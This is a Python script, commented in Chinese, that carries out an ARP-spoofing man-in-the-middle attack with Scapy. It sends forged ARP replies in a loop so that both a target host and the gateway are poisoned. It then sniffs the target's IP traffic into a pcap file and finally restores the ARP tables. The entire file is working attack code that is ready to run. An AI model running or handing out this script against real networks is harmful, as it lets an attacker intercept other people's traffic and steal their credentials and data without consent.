# 导入 Scapy 库，用于网络数据包捕获、构造和分析
from scapy.all import *
# 导入系统相关模块
import os
import sys
import threading
import signal
import time

# 恢复目标主机和网关的 ARP 表，修复 ARP 欺骗的影响
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    # 发送 ARP 响应（op=2），将网关的正确 MAC 地址广播到目标主机
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    # 发送 ARP 响应，将目标主机的正确 MAC 地址广播到网关
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac))
    # 终止当前进程，结束程序
    os.kill(os.getpid(), signal.SIGINT)

# 获取指定 IP 地址对应的 MAC 地址
def get_mac(ip_address):
    # 发送 ARP 请求（广播），询问指定 IP 的 MAC 地址
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    # 遍历响应，提取 MAC 地址
    for s, r in responses:
        return r[Ether].src
    # 如果未收到响应，返回 None
    return None

# 执行 ARP 欺骗攻击，伪装为网关和目标主机
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # 创建针对目标主机的 ARP 响应，伪装为网关
    poison_target = ARP()
    poison_target.op = 2  # ARP 响应
    poison_target.psrc = gateway_ip  # 伪装为网关的 IP
    poison_target.pdst = target_ip   # 目标主机的 IP
    poison_target.hwdst = target_mac # 目标主机的 MAC

    # 创建针对网关的 ARP 响应，伪装为目标主机
    poison_gateway = ARP()
    poison_gateway.op = 2  # ARP 响应
    poison_gateway.psrc = target_ip   # 伪装为目标主机的 IP
    poison_gateway.pdst = gateway_ip  # 网关的 IP
    poison_gateway.hwdst = gateway_mac # 网关的 MAC

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    # 持续发送伪造的 ARP 响应，保持欺骗状态
    while True:
        try:
            send(poison_target)   # 欺骗目标主机
            send(poison_gateway)  # 欺骗网关
            time.sleep(2)         # 每 2 秒发送一次
        except KeyboardInterrupt:
            # 如果用户按 Ctrl+C，恢复 ARP 表
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    
    print("[*] ARP poison attack finished.")
    return

# 配置网络接口、目标 IP、网关 IP 和捕获数据包数量
interface = "en1"           # 网络接口（需要替换为实际接口，例如 eth0）
target_ip = "192.168.1.1"   # 目标主机的 IP 地址
gateway_ip = "192.168.1.254" # 网关（路由器）的 IP 地址
packet_count = 1000         # 要捕获的数据包数量

# 设置 Scapy 的网络接口
conf.iface = interface
# 关闭 Scapy 的详细输出
conf.verb = 0

print("[*] Setting up %s" % interface)

# 获取网关的 MAC 地址
gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

# 获取目标主机的 MAC 地址
target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Target %s is at %s" % (target_ip, target_mac))

# 启动 ARP 欺骗线程
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)
    
    # 设置 BPF 过滤器，仅捕获目标主机的 IP 流量
    bpf_filter = "ip host %s" % target_ip
    # 嗅探指定数量的数据包
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    # 将捕获的数据包保存到 arper.pcap 文件
    wrpcap('arper.pcap', packets)

    # 嗅探完成后，恢复 ARP 表
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    # 如果用户按 Ctrl+C，恢复 ARP 表并退出
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)